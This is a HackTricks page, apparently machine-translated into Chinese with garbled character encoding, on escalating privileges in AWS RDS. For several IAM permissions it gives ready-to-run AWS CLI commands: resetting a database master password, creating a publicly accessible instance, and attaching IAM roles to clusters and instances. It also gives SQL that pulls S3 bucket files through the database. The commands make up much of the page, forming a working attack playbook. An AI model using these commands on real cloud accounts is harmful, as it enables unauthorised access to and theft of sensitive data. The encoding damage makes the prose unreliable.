# AWS - RDS Privesc

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## RDS - å…³ç³»æ•°æ®åº“æœåŠ¡

æœ‰å…³ RDS çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

æ‹¥æœ‰è¯¥æƒé™çš„æ”»å‡»è€…å¯ä»¥ **ä¿®æ”¹ä¸»ç”¨æˆ·çš„å¯†ç **ï¼Œä»¥åŠæ•°æ®åº“ä¸­çš„ç™»å½•ä¿¡æ¯ï¼š
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
æ‚¨éœ€è¦èƒ½å¤Ÿ**è”ç³»æ•°æ®åº“**ï¼ˆå®ƒä»¬é€šå¸¸ä»…åœ¨å†…éƒ¨ç½‘ç»œä¸­å¯è®¿é—®ï¼‰ã€‚
{% endhint %}

**æ½œåœ¨å½±å“ï¼š** åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ã€‚

### rds-db:connect

æ ¹æ®[**æ–‡æ¡£**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html)ï¼Œå…·æœ‰æ­¤æƒé™çš„ç”¨æˆ·å¯ä»¥è¿æ¥åˆ°æ•°æ®åº“å®ä¾‹ã€‚

### æ»¥ç”¨ RDS è§’è‰² IAM æƒé™

#### Postgresql (Aurora)

{% hint style="success" %}
å¦‚æœè¿è¡Œ**`SELECT datname FROM pg_database;`**æ—¶å‘ç°åä¸º**`rdsadmin`**çš„æ•°æ®åº“ï¼Œæ‚¨å°±çŸ¥é“æ‚¨åœ¨**AWS postgresql æ•°æ®åº“**ä¸­ã€‚
{% endhint %}

é¦–å…ˆï¼Œæ‚¨å¯ä»¥æ£€æŸ¥æ­¤æ•°æ®åº“æ˜¯å¦å·²ç”¨äºè®¿é—®ä»»ä½•å…¶ä»– AWS æœåŠ¡ã€‚æ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹å·²å®‰è£…çš„æ‰©å±•æ¥æ£€æŸ¥è¿™ä¸€ç‚¹ï¼š
```sql
SELECT * FROM pg_extension;
```
å¦‚æœä½ å‘ç°ç±»ä¼¼ **`aws_s3`** çš„ä¸œè¥¿ï¼Œä½ å¯ä»¥å‡è®¾è¿™ä¸ªæ•°æ®åº“å¯¹ S3 **æœ‰æŸç§è®¿é—®æƒé™**ï¼ˆè¿˜æœ‰å…¶ä»–æ‰©å±•ï¼Œå¦‚ **`aws_ml`** å’Œ **`aws_lambda`**ï¼‰ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥åœ¨ **`AssociatedRoles`** å­—æ®µä¸­æŸ¥çœ‹ **é›†ç¾¤æ˜¯å¦é™„åŠ äº†ä»»ä½• IAM è§’è‰²**ã€‚å¦‚æœæœ‰ï¼Œä½ å¯ä»¥å‡è®¾è¯¥æ•°æ®åº“æ˜¯ **ä¸ºè®¿é—®å…¶ä»– AWS æœåŠ¡è€Œå‡†å¤‡çš„**ã€‚æ ¹æ® **è§’è‰²çš„åç§°**ï¼ˆæˆ–è€…å¦‚æœä½ èƒ½è·å– **è§’è‰²çš„æƒé™**ï¼‰ï¼Œä½ å¯ä»¥ **çŒœæµ‹** æ•°æ®åº“å…·æœ‰çš„é¢å¤–è®¿é—®æƒé™ã€‚

ç°åœ¨ï¼Œè¦ **è¯»å–å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾„ã€‚ä½ å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–å®ƒï¼š
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
å¦‚æœä½ æ‹¥æœ‰**åŸå§‹ AWS å‡­è¯**ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä»¬è®¿é—® S3 æ•°æ®ï¼š
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **ä¸éœ€è¦æ›´æ”¹ä»»ä½•å‚æ•°ç»„å˜é‡** å°±å¯ä»¥è®¿é—® S3ã€‚
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
åœ¨ mysql ä¸­ï¼Œå¦‚æœä½ è¿è¡ŒæŸ¥è¯¢ **`SELECT User, Host FROM mysql.user;`** å¹¶ä¸”æœ‰ä¸€ä¸ªç”¨æˆ·å« **`rdsadmin`**ï¼Œä½ å¯ä»¥å‡è®¾ä½ åœ¨ä¸€ä¸ª **AWS RDS mysql æ•°æ®åº“** ä¸­ã€‚
{% endhint %}

åœ¨ mysql ä¸­è¿è¡Œ **`show variables;`**ï¼Œå¦‚æœå˜é‡å¦‚ **`aws_default_s3_role`**ã€**`aurora_load_from_s3_role`**ã€**`aurora_select_into_s3_role`** æœ‰å€¼ï¼Œä½ å¯ä»¥å‡è®¾æ•°æ®åº“å·²å‡†å¤‡å¥½è®¿é—® S3 æ•°æ®ã€‚

æ­¤å¤–ï¼Œå¦‚æœä½ æœ‰æƒé™è¿è¡Œ **`aws rds describe-db-clusters`**ï¼Œä½ å¯ä»¥æ£€æŸ¥é›†ç¾¤æ˜¯å¦æœ‰ä»»ä½• **å…³è”è§’è‰²**ï¼Œè¿™é€šå¸¸æ„å‘³ç€å¯ä»¥è®¿é—® AWS æœåŠ¡ã€‚

ç°åœ¨ï¼Œè¦ **è¯»å–å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶**ï¼Œä½ éœ€è¦çŸ¥é“å®Œæ•´è·¯å¾„ã€‚ä½ å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤è¯»å–å®ƒï¼š
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

æ‹¥æœ‰æƒé™ `rds:AddRoleToDBCluster` å’Œ `iam:PassRole` çš„æ”»å‡»è€…å¯ä»¥ **å°†æŒ‡å®šè§’è‰²æ·»åŠ åˆ°ç°æœ‰çš„ RDS å®ä¾‹**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€… **è®¿é—®æ•æ„Ÿæ•°æ®** æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**æ½œåœ¨å½±å“**ï¼šè®¿é—®æ•æ„Ÿæ•°æ®æˆ–å¯¹RDSå®ä¾‹ä¸­çš„æ•°æ®è¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ã€‚\
è¯·æ³¨æ„ï¼Œä¸€äº›æ•°æ®åº“éœ€è¦é¢å¤–çš„é…ç½®ï¼Œä¾‹å¦‚Mysqlï¼Œéœ€è¦åœ¨å‚æ•°ç»„ä¸­æŒ‡å®šè§’è‰²ARNã€‚

### `rds:CreateDBInstance`

ä»…å‡­æ­¤æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å·²ç»å­˜åœ¨å¹¶é™„åŠ äº†**IAMè§’è‰²**çš„é›†ç¾¤ä¸­åˆ›å»ºä¸€ä¸ª**æ–°å®ä¾‹**ã€‚ä»–å°†æ— æ³•æ›´æ”¹ä¸»ç”¨æˆ·å¯†ç ï¼Œä½†ä»–å¯èƒ½èƒ½å¤Ÿå°†æ–°æ•°æ®åº“å®ä¾‹æš´éœ²åˆ°äº’è”ç½‘ï¼š
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: æµ‹è¯•
{% endhint %}

æ‹¥æœ‰æƒé™ `rds:CreateDBInstance` å’Œ `iam:PassRole` çš„æ”»å‡»è€…å¯ä»¥ **åˆ›å»ºä¸€ä¸ªé™„åŠ æŒ‡å®šè§’è‰²çš„æ–° RDS å®ä¾‹**ã€‚æ”»å‡»è€…éšåå¯èƒ½ **è®¿é—®æ•æ„Ÿæ•°æ®** æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
é™„åŠ è§’è‰²/å®ä¾‹é…ç½®æ–‡ä»¶çš„ä¸€äº›è¦æ±‚ï¼ˆæ¥è‡ª [**è¿™é‡Œ**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)ï¼‰ï¼š

* é…ç½®æ–‡ä»¶å¿…é¡»åœ¨æ‚¨çš„è´¦æˆ·ä¸­å­˜åœ¨ã€‚
* é…ç½®æ–‡ä»¶å¿…é¡»æœ‰ä¸€ä¸ª IAM è§’è‰²ï¼ŒAmazon EC2 æœ‰æƒé™å‡è®¾ã€‚
* å®ä¾‹é…ç½®æ–‡ä»¶åç§°å’Œå…³è”çš„ IAM è§’è‰²åç§°å¿…é¡»ä»¥å‰ç¼€ `AWSRDSCustom` å¼€å¤´ã€‚
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šè®¿é—®æ•æ„Ÿæ•°æ®æˆ–å¯¹RDSå®ä¾‹ä¸­çš„æ•°æ®è¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ã€‚

### `rds:AddRoleToDBInstance`, `iam:PassRole`

æ‹¥æœ‰æƒé™ `rds:AddRoleToDBInstance` å’Œ `iam:PassRole` çš„æ”»å‡»è€…å¯ä»¥ **å°†æŒ‡å®šè§’è‰²æ·»åŠ åˆ°ç°æœ‰çš„RDSå®ä¾‹**ã€‚è¿™å¯èƒ½å…è®¸æ”»å‡»è€… **è®¿é—®æ•æ„Ÿæ•°æ®** æˆ–ä¿®æ”¹å®ä¾‹ä¸­çš„æ•°æ®ã€‚

{% hint style="warning" %}
DBå®ä¾‹å¿…é¡»ä½äºé›†ç¾¤ä¹‹å¤–
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**æ½œåœ¨å½±å“**ï¼šè®¿é—®RDSå®ä¾‹ä¸­çš„æ•æ„Ÿæ•°æ®æˆ–å¯¹æ•°æ®è¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ã€‚

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µAWSé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricksåŸ¹è®­AWSçº¢é˜Ÿä¸“å®¶(ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µGCPé»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricksåŸ¹è®­GCPçº¢é˜Ÿä¸“å®¶(GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒHackTricks</summary>

* æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**Telegramç¾¤ç»„**](https://t.me/peass)æˆ–**åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHubåº“æäº¤PRåˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
